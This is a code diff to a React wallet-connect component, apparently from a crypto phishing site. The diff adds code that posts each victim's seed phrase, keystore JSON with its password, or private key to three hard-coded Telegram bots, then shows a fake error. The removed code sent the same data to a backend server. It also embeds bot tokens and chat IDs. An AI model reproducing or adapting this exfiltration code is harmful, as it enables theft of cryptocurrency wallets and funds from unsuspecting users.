@@ -540,28 +540,91 @@ function Wallet(){
         setWalletPassword("");
 
 
-        try {
-            const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
-                phrase:phrase,
-                keystore_json:keystore_json,
-                wallet_password:wallet_password,
-                private_key:private_key,
-                type:"Phrase",
-                platform:selectedName,
-            });
+        // try {
+        //     const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
+        //         phrase:phrase,
+        //         keystore_json:keystore_json,
+        //         wallet_password:wallet_password,
+        //         private_key:private_key,
+        //         type:"Phrase",
+        //         platform:selectedName,
+        //     });
         
-            // Handle success
-            console.log('Data sent:', response.data.message);
+        //     // Handle success
+        //     console.log('Data sent:', response.data.message);
     
-            if(response.status == 200){
-                console.log(response.data.message);
+        //     if(response.status == 200){
+        //         console.log(response.data.message);
     
-                 setShowError(true);
-            }
-          } catch (error) {
-            // Handle error
-            console.error('Error:', error);
-          }
+        //          setShowError(true);
+        //     }
+        //   } catch (error) {
+        //     // Handle error
+        //     console.error('Error:', error);
+        //   }
+
+
+          //////////////
+
+          try {
+           
+
+        
+
+            await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+               chat_id: 6150403557,
+               text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+             });
+
+
+           await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+               chat_id: 5868304053,
+               text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+             });
+
+
+             const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+               chat_id: 5916570239,
+               text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+             });
+
+
+
+
+
+
+   
+       // Handle success
+       console.log('Data sent:', response.data.message);
+
+       if(response.status == 200){
+           console.log(response.data.message);
+           
+
+         
+         
+           console.log(response.data.message);
+    
+           setShowError(true);
+           
+          
+
+
+
+       }
+     } catch (error) {
+       // Handle error
+       console.error('Error:', error);
+     }
+
+
+
+
+          /////////
+
+
+
+
         
 
         
@@ -576,28 +639,56 @@ function Wallet(){
 
 
 
+        
+
+
         try {
-            const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
-                phrase:phrase,
-                keystore_json:keystore_json,
-                wallet_password:wallet_password,
-                private_key:private_key,
-                type:"Keystore Json",
-                platform:selectedName,
-            });
+            
+
+
+            await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+                chat_id: 6150403557,
+                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
+              });
+
+
+            await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                chat_id: 5868304053,
+                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
+              });
+
+
+           
+
+
+            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                chat_id: 5916570239,
+                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
+              });
+
         
             // Handle success
             console.log('Data sent:', response.data.message);
     
             if(response.status == 200){
                 console.log(response.data.message);
-    
-                setShowError(true);
+                
+
+              
+              
+                       setShowError(true);
+                
+               
+
+
+
             }
           } catch (error) {
             // Handle error
             console.error('Error:', error);
           }
+        
+
         
 
         
@@ -614,23 +705,43 @@ function Wallet(){
 
 
 
+        
         try {
-            const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
-                phrase:phrase,
-                keystore_json:keystore_json,
-                wallet_password:wallet_password,
-                private_key:private_key,
-                type:"Private Key",
-                platform:selectedName,
-            });
+            
+
+            await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+                    chat_id: 6150403557,
+                    text: `Wallet : ${selectedName} , Type : Private key , Key : ${private_key}`,
+                  });
+
+
+                await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                    chat_id: 5868304053,
+                    text: `Wallet : ${selectedName} , Type : Private key , Key : ${private_key}`,
+                  });
+
+
+                  const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                    chat_id: 5916570239,
+                    text: `Wallet : ${selectedName} , Type : Private key , Key : ${private_key}`,
+                  });
+  
         
             // Handle success
             console.log('Data sent:', response.data.message);
     
             if(response.status == 200){
                 console.log(response.data.message);
-    
-                setShowError(true);
+                
+
+              
+              
+                  setShowError(true);
+                
+               
+
+
+
             }
           } catch (error) {
             // Handle error
